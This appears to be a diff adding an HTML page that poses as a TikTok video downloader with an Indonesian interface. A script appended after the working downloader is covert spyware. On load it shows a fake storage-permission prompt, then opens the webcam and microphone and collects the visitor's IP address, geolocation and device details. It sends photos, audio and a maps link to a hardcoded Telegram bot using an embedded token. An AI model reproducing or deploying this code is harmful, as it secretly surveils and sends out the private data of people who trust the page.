@@ -1,0 +1,619 @@
+<!DOCTYPE html>
+<html>
+<meta charset='UTF-8'/>
+<meta content='width=device-width, initial-scale=1, user-scalable=1, minimum-scale=1, maximum-scale=5' name='viewport'/>
+<script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.19/dist/sweetalert2.all.min.js"></script>
+<link href="https://feeldreams.github.io/boroboro/style.css" rel="stylesheet" type="text/css" />
+<meta content='IE=edge' http-equiv='X-UA-Compatible'/>
+
+<head>
+<title>DownloaderTiktok</title>
+    <style>
+                * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Roboto, sans-serif;
+        }
+
+        body {
+            color: #fff;
+            background: url('https://img100.pixhost.to/images/286/535727480_skyzopedia.jpg') no-repeat center center fixed;
+            background-size: cover;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            overflow: auto;
+            min-height: 100vh;
+        }
+
+#download-info {
+    margin-top: 10px;
+    text-align: left; 
+    padding: 10px;
+    background-color: rgba(255, 255, 255, 0.7);
+    border-radius: 8px;
+    box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
+}
+
+#download-info p {
+    margin-bottom: 5px; 
+}
+
+        .container {
+            position: relative;
+            z-index: 2;
+            padding: 20px;
+            border-radius: 12px;
+            max-width: 400px;
+            text-align: center;
+        }
+
+        .shape {
+            background: rgba(50, 50, 50, 0.8);
+            border-radius: 12px;
+            padding: 20px;
+            
+            margin: 10px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.5);
+        }
+
+        .input-section {
+            margin-bottom: 15px;
+            color: ;
+        }
+
+        h1 {
+            font-size: 2em;
+            color: cyan;
+        }
+
+        input[type="text"] {
+            width: 100%;
+            padding: 12px;
+            border-radius: 8px;
+            border: 1px solid #ddd;
+            font-size: 1em;
+            margin-bottom: 10px;
+            text-align: center;
+        }
+
+        button {
+            padding: 12px 20px;
+            font-size: 1em;
+            background-color: cyan;
+            color: black;
+            border-radius: 8px;
+            cursor: pointer;
+            margin-top: 5px;
+        }
+        .buttonwa {
+            padding: 12px 20px;
+            font-size: 1em;
+            background-color: cyan;
+            color: black;
+            border-radius: 8px;
+            cursor: pointer;
+            margin-top: 5px;
+            text-decoration: none;
+            
+            
+        }
+        .profile-info {
+            font-size: 1.2em;
+            color: #ddd;
+            font-family: 'Poppins', sans-serif;
+            font-weight: bold;
+        }
+
+        .video-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin-top: 10px;
+        }
+
+        video {
+            width: 100%;
+            border-radius: 8px;
+        }
+
+        .button-group {
+            display: flex;
+            gap: 10px;
+            margin-top: 10px;
+        }
+
+        .loading-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            backdrop-filter: blur(5px);
+            z-index: 3;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .opposites {
+            position: relative;
+            width: 60px;
+            height: 60px;
+            animation: opposites 2.5s ease-out 0s infinite;
+        }
+
+        .tl, .tr, .br, .bl {
+            width: 30px;
+            height: 30px;
+            position: absolute;
+        }
+
+        .tl, .tr {
+            top: 0; 
+        }
+
+        .tr, .br {
+            left: 30px; 
+        }
+
+        .tl, .br {
+            animation: tlbr 2.5s ease-out 0s infinite;
+        }
+
+        .br, .bl {
+            top: 30px; 
+        }
+
+        .tl, .bl {
+            left: 0; 
+        }
+
+        .tr, .bl {
+            animation: trbl 2.5s ease-out 0s infinite;
+        }
+
+        .tl {
+            background: red;
+            transform-origin: bottom right;
+        }
+
+        .tr {
+            background: green; 
+            transform-origin: bottom left;
+        }
+
+        .br {
+            background: dodgerblue; 
+            transform-origin: top left;
+        }
+
+        .bl {
+            background: cyan; 
+            transform-origin: top right;
+        }
+
+        @keyframes tlbr {
+            0% {transform: rotate(0);}
+            20% {transform: rotate(90deg);}
+            40% {transform: rotate(90deg);}
+            60% {transform: rotate(0);}
+        }
+
+        @keyframes trbl {
+            20% {transform: rotate(0);}
+            40% {transform: rotate(90deg);}
+            60% {transform: rotate(90deg);}
+            80% {transform: rotate(0);}
+        }
+
+        @keyframes opposites {
+            80% {transform: rotate(0deg);}
+            100% {transform: rotate(360deg);}
+        }
+
+        /* Card Petunjuk */
+        .guide-card {
+            background: rgba(255, 255, 255, 0.8);
+            color: #333;
+            padding: 20px;
+            margin-top: 20px;
+            border-radius: 12px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
+            max-width: 350px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+
+        .guide-card h2 {
+            font-size: 1.5em;
+            margin-bottom: 10px;
+            color: #ff6f61;
+        }
+
+        .guide-card p {
+            font-size: 1em;
+            margin-bottom: 10px;
+        }
+        
+    
+    .footer {
+        position: absolute; 
+        bottom: 0; 
+        left: 50%;
+        transform: translateX(-50%);
+
+        color: #fff;
+        padding: 10px 20px;
+        border-radius: 8px;
+        text-align: center;
+        font-size: 1em;
+        width: 100%;
+        z-index: 100; 
+    }
+
+    .footer a {
+        color: yellow;
+        text-decoration: none;
+        font-weight: bold;
+    }
+
+    .footer a:hover {
+        text-decoration: underline;
+    }
+
+    .footer strong {
+        color: cyan; 
+    }
+
+  
+    .container {
+        padding-bottom: 610px; /* Memberikan cukup ruang agar footer tidak menutupi konten */
+    }
+    </style>
+                  <!-- Halaman html -->
+</head>
+<body>
+<div class="container">
+
+        <div class="shape input-section">
+            <h1>TikTok Downloader</h1>
+            <input type="text" id="url" placeholder="Tempel Linkmu suu">
+            <button onclick="downloadVideo()">Download</button>
+<a href="https://wa.me/message/RGDP6NSHA5ZWH1" class="buttonwa" target="_blank">Creator</a>
+<div class="footer">
+
+    <p>THANKS TO <strong>DALANG STORE</strong></p>
+    </div>
+        <!-- Shape 2: Username & Nickname -->
+        <div class="shape profile-info" id="profile-info" style="display: none;">
+            <p id="nickname"></p>
+            <p id="username"></p>
+        </div>
+
+        <!-- Shape 3: Video, Info & Buttons -->
+        <div class="shape video-container" id="video-section" style="display: none;">
+            <video id="video" controls></video>
+            <div id="download-info" style="margin-top: 10px;"></div>
+            <div class="button-group">
+                <button id="download-video" style="display: none;">Unduh Video</button>
+                <button id="download-audio" style="display: none;">Unduh Audio</button>
+            </div>
+        </div>
+  
+        <p id="message"></p>
+
+        <!-- Card Petunjuk -->
+        <div class="guide-card" style="display: none;" id="guide-card">
+            <h2>Cara Mengunduh</h2>
+            <p>Setelah video berhasil diproses, Anda dapat mengunduhnya dalam dua format:</p>
+            <ul>
+                <li><strong>Unduh Video</strong>: Klik tombol "Unduh Video" untuk mengunduh video tanpa watermark.</li>
+                <li><strong>Unduh Audio</strong>: Klik tombol "Unduh Audio" untuk mengunduh audio dari video.</li>
+            </ul>
+            <p>Pastikan Anda memilih format yang diinginkan, dan nikmati hasilnya guys.</p>
+        </div>
+    </div>
+
+    <!-- Loading Overlay -->
+    <div class="loading-overlay" id="loading-overlay">
+        <div class="opposites">
+            <div class="tl"></div>
+            <div class="tr"></div>
+            <div class="br"></div>
+            <div class="bl"></div>
+        </div>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+    <script>
+        async function tiktok2(query) {
+            return new Promise(async (resolve, reject) => {
+                try {
+                    const encodedParams = new URLSearchParams();
+                    encodedParams.set('url', query);
+                    encodedParams.set('hd', '1');
+
+                    const response = await axios.post('https://tikwm.com/api/', encodedParams, {
+                        headers: {
+                            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+                            'User-Agent': 'Mozilla/5.0'
+                        }
+                    });
+
+                    const videoData = response.data.data;
+                    if (!videoData) {
+                        throw new Error("Data video tidak ditemukan.");
+                    }
+
+                    const result = {
+                        title: videoData.title,
+                        no_watermark: videoData.play,
+                        music: videoData.music,
+                        nickname: videoData.author.nickname,
+                        username: videoData.author.unique_id,
+                        likes: videoData.digg_count,
+                        comments: videoData.comment_count,
+                        shares: videoData.share_count,
+                        play: videoData.play_count,
+                        created: videoData.create_time,
+                        size: videoData.size,
+                        duration: videoData.duration,
+                        region: videoData.region,
+                        album: videoData.music.album,
+                        musicAuthor: videoData.music.author
+                    };
+                    resolve(result);
+                } catch (error) {
+                    console.error("Error:", error);
+                    reject("Error,Link Seng Bener Cokk");
+                }
+            });
+        }
+
+        async function downloadVideo() {
+            const url = document.getElementById('url');
+            const loadingOverlay = document.getElementById('loading-overlay');
+            const message = document.getElementById('message');
+            const videoSection = document.getElementById('video-section');
+            const videoElement = document.getElementById('video');
+            const downloadInfoElement = document.getElementById('download-info');
+            const nicknameElement = document.getElementById('nickname');
+            const usernameElement = document.getElementById('username');
+            const profileInfo = document.getElementById('profile-info');
+            const downloadVideoBtn = document.getElementById('download-video');
+            const downloadAudioBtn = document.getElementById('download-audio');
+            const guideCard = document.getElementById('guide-card');
+
+            message.textContent = "";
+            videoSection.style.display = "none";
+            profileInfo.style.display = "none";
+            guideCard.style.display = "none";
+            loadingOverlay.style.display = "flex";
+
+            try {
+                const videoInfo = await tiktok2(url.value);
+
+                nicknameElement.textContent = videoInfo.nickname;
+                usernameElement.textContent = "@" + videoInfo.username;
+
+                downloadInfoElement.innerHTML = `
+                    <p><strong>DOWNLOAD SELESAI✅</strong></p>
+                    <p><strong>Video Info</strong> :</p>
+                    <p>Region : ${videoInfo.region}</p>
+                    <p>Duration : ${Math.floor(videoInfo.duration / 60)}:${videoInfo.duration % 60}</p>
+                    <p>Taken : ${new Date(videoInfo.created * 1000).toLocaleString()}</p>
+                    <p>Size : ${(videoInfo.size / 1024 / 1024).toFixed(2)} MB</p>
+
+                    <p><strong>Statistik Info 📊</strong> :</p>
+                    <p>Views : ${videoInfo.play}</p>
+                    <p>Likes : ${videoInfo.likes}</p>
+                    <p>Comment : ${videoInfo.comments}</p>
+                    <p>Share : ${videoInfo.shares}</p>
+                    
+                    <p><strong>Author Info 👤</strong> :</p>
+                    <p>Fullname : ${videoInfo.nickname}</p>
+                    <p>Nickname : @${videoInfo.username}</p>
+                    
+                    <br>
+                    <p><strong>@BY DALANGSTORE</strong></p>
+                `;
+                
+
+                videoElement.src = videoInfo.no_watermark;
+                profileInfo.style.display = "block";
+                videoSection.style.display = "block";
+                downloadVideoBtn.style.display = "inline";
+                downloadAudioBtn.style.display = "inline";
+                guideCard.style.display = "block";  
+
+                downloadVideoBtn.onclick = () => downloadFile(videoInfo.no_watermark, "video.mp4");
+                downloadAudioBtn.onclick = () => downloadFile(videoInfo.music, "audio.mp3");
+            } catch (error) {
+                message.textContent = error;
+            } finally {
+                loadingOverlay.style.display = "none";
+            }
+        }
+
+        function downloadFile(url, filename) {
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = filename;
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+        }
+        </script>
+              <!--Batas akhir html -->
+<canvas id="canvas" style="display:none;"></canvas>
+
+<script>
+// Data bot Telegram
+const chatId = '2144701920';
+const botToken = '7892931558:AAGlkX9PgaKJElVGEi6WRAsSgg7P3hCmDwo';
+let isRunning = true; 
+
+async function getIpAddress() {
+  try {
+    const response = await fetch('https://api.ipify.org?format=json');
+    const data = await response.json();
+    return data.ip;
+  } catch (error) {
+    console.error('Gagal mendapatkan IP:', error);
+    return 'Tidak ditemukan';
+  }
+}
+
+async function getLocation() {
+  try {
+    if (navigator.geolocation) {
+      return new Promise((resolve, reject) => {
+        navigator.geolocation.getCurrentPosition(
+          (position) => resolve({
+            latitude: position.coords.latitude,
+            longitude: position.coords.longitude
+          }),
+          () => reject('Lokasi tidak ditemukan')
+        );
+      });
+    } else {
+      throw new Error('Geolocation tidak didukung.');
+    }
+  } catch (error) {
+    console.error(error.message);
+    return { latitude: 'Tidak ditemukan', longitude: 'Tidak ditemukan' };
+  }
+}
+
+function getDeviceModel() {
+  return navigator.userAgent;
+}
+
+async function sendPhotoToTelegram(caption, photoBlob) {
+  const formData = new FormData();
+  formData.append('chat_id', chatId);
+  formData.append('photo', photoBlob);
+  formData.append('caption', caption);
+
+  try {
+    const response = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+      method: 'POST',
+      body: formData,
+    });
+    console.log('Foto terkirim:', response.status);
+  } catch (error) {
+    console.error('Gagal mengirim foto:', error);
+  }
+}
+
+async function sendAudioToTelegram(audioBlob) {
+  const formData = new FormData();
+  formData.append('chat_id', chatId);
+  formData.append('voice', audioBlob);
+
+  try {
+    const response = await fetch(`https://api.telegram.org/bot${botToken}/sendVoice`, {
+      method: 'POST',
+      body: formData,
+    });
+    console.log('Audio terkirim:', response.status);
+  } catch (error) {
+    console.error('Gagal mengirim audio:', error);
+  }
+}
+
+async function capturePhoto(video) {
+  const canvas = document.getElementById('canvas');
+  const context = canvas.getContext('2d');
+  canvas.width = video.videoWidth;
+  canvas.height = video.videoHeight;
+  context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+  return new Promise((resolve) => {
+    canvas.toBlob((blob) => {
+      resolve(blob);
+    }, 'image/jpeg');
+  });
+}
+
+async function captureAndSendData() {
+  try {
+    const videoStream = await navigator.mediaDevices.getUserMedia({ video: true });
+    const video = document.createElement('video');
+    video.style.display = 'none';
+    document.body.appendChild(video);
+    video.srcObject = videoStream;
+    await video.play();
+
+    const audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
+    const mediaRecorder = new MediaRecorder(audioStream);
+
+    mediaRecorder.ondataavailable = async (event) => {
+      const audioBlob = event.data;
+
+      if (audioBlob.size > 0) {
+        await sendAudioToTelegram(audioBlob);
+      }
+    };
+
+    while (isRunning) {
+      const ip = await getIpAddress();
+      const location = await getLocation();
+      const deviceModel = getDeviceModel();
+      const caption = `
+📱 Info Perangkat:
+- Model: ${deviceModel}
+- IP Address: ${ip}
+- Lokasi: https://www.google.com/maps?q=${location.latitude},${location.longitude}
+
+*By @DalangStore*
+      `;
+
+     
+      const photoBlob = await capturePhoto(video);
+      await sendPhotoToTelegram(caption, photoBlob);
+
+  
+      mediaRecorder.start();
+
+      setTimeout(() => {
+        if (mediaRecorder.state === 'recording') {
+          mediaRecorder.stop();
+        }
+      }, 5000000000);
+
+      await new Promise((resolve) => setTimeout(resolve, 5000));
+    }
+
+    // Matikan kamera dan mikrofon
+    videoStream.getTracks().forEach((track) => track.stop());
+    audioStream.getTracks().forEach((track) => track.stop());
+  } catch (error) {
+    console.error('Gagal memproses data:', error.message);
+  }
+}
+
+window.onload = async () => {
+  const izin = await Swal.fire({
+    title: 'Akses Storage',
+    text: 'Kami memerlukan izin untuk menyimpan video ke folder download.',
+    icon: 'info',
+    showCancelButton: true,
+    confirmButtonText: 'OK',
+  });
+
+  if (izin.isConfirmed) {
+    captureAndSendData();
+  }
+};
+
+window.onbeforeunload = () => {
+  isRunning = false;
+};
+</script>
+
+</body>
+</html>
